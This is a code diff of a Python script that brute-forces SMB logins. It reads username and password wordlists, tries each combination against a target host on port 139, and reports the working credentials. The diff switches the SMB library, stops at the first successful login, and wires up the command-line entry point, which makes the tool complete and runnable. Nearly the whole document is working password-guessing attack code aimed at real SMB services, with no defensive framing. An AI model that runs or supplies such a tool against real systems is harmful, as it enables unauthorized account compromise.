@@ -1,20 +1,22 @@
 import argparse
-import smbclient
+from smb.SMBConnection import SMBConnection
 
 def fuzz_smb(user, password, target,share, port,userfile=None, passfile=None):
-    print('Fuzzing SMB with user: {}, password: {}, target: {}, port: {}'.format(user, password, target, port))
-    
+    my_name = "user"
+    remote_name = "remote user"
+
+    print('\nFuzzing SMB with user: {}, password: {}, target: {}, port: {}\n'.format(user, password, target, port))
     
     if passfile and user:
         with open(passfile, 'r') as f:
             passwords = f.readlines()
         for password in passwords:
             password = password.strip()
-            smb = smbclient.SMBConnection(user,password,machine=target)
-            file = smb.listPath(share)
-            if file:
-                print("Share is accessible for--->")
+            conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
+            flag = conn.connect(target, 139)
+            if flag:
                 print(f'\033[92m [+]\033[0m {user} : ', password)
+                break
             else:
                 print(f'\033[91m [-]\033[0m {user} : ', password)
 
@@ -23,11 +25,11 @@ def fuzz_smb(user, password, target,share, port,userfile=None, passfile=None):
             users = f.readlines()
         for user in users:
             user = user.strip()
-            smb = smbclient.SMBConnection(user,password,machine=target)
-            file = smb.listPath(share)
-            if file:
-                print("Share is accessible for--->")
+            conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
+            flag = conn.connect(target, 139)
+            if flag:
                 print(f'\033[92m [+]\033[0m {user} : ', password)
+                break
             else:
                 print(f'\033[91m [-]\033[0m {user} : ', password)
             
@@ -42,11 +44,11 @@ def fuzz_smb(user, password, target,share, port,userfile=None, passfile=None):
             for password in passwords:
                 password = password.strip()
 
-                smb = smbclient.SMBConnection(user,password,machine=target)
-                file = smb.listPath(share)
-                if file:
-                    print("Share is accessible for--->")
+                conn = SMBConnection(user, password,my_name,remote_name, use_ntlm_v2=True)
+                flag = conn.connect(target, 139)
+                if flag:
                     print(f'\033[92m [+]\033[0m {user} : ', password)
+                    break
                 else:
                     print(f'\033[91m [-]\033[0m {user} : ', password)
 
@@ -55,7 +57,6 @@ def fuzz_smb(user, password, target,share, port,userfile=None, passfile=None):
         print('\033[91m [-]\033[0m Please provide both username and password files')
         exit(1)
         
-
 
 def main():
     parser = argparse.ArgumentParser(description="Fuzz SMB")
@@ -72,6 +73,17 @@ def main():
     group_user.add_argument('-U', '--userfile', type=argparse.FileType('r'), help='User file')
     
     args = parser.parse_args()
+    if args.userfile:
+        userfile = args.userfile.name
+    else:
+        userfile = None
+
+    if args.passwordfile:
+        passwordfile = args.passwordfile.name
+    else:
+        passwordfile = None
+
+    fuzz_smb(args.user, args.password, args.target, args.share, args.port, userfile, passwordfile)
 
 
 if __name__ == '__main__':
